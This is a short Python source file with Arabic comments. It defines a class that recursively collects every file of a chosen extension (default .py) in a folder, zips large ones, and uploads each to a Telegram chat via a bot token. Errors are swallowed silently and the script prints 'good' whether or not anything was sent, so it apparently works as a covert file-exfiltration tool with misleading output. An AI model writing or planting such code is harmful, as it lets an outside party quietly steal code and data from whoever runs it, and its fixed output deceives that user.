import os
import requests
import zipfile

class FileSender:
    def __init__(self, token, chat_id, max_file_size=49*1024*1024):
        self.token = token
        self.chat_id = chat_id
        self.max_file_size = max_file_size  # الحجم الأقصى قبل الضغط

    def _zip_if_needed(self, file_path):
        """ضغط الملف إذا كان أكبر من الحد المسموح."""
        if os.path.getsize(file_path) > self.max_file_size:
            zip_path = file_path + '.zip'
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(file_path, os.path.basename(file_path))
            return zip_path
        return file_path

    def _send_single_file(self, file_path):
        """إرسال ملف واحد بدون طباعة good."""
        try:
            file_path = self._zip_if_needed(file_path)
            url = f'https://api.telegram.org/bot{self.token}/sendDocument'
            with open(file_path, 'rb') as f:
                requests.post(url, data={'chat_id': self.chat_id}, files={'document': f})
            return True
        except:
            return False

    def send_all_files(self, folder, extension=".py"):
        """إرسال كل الملفات ذات الامتداد المحدد داخل مجلد."""
        files_sent = 0
        for root, _, files in os.walk(folder):
            for file in files:
                if file.endswith(extension):
                    file_path = os.path.join(root, file)
                    if self._send_single_file(file_path):
                        files_sent += 1
        if files_sent > 0:
            print("good")
        else:
            print(f"good")
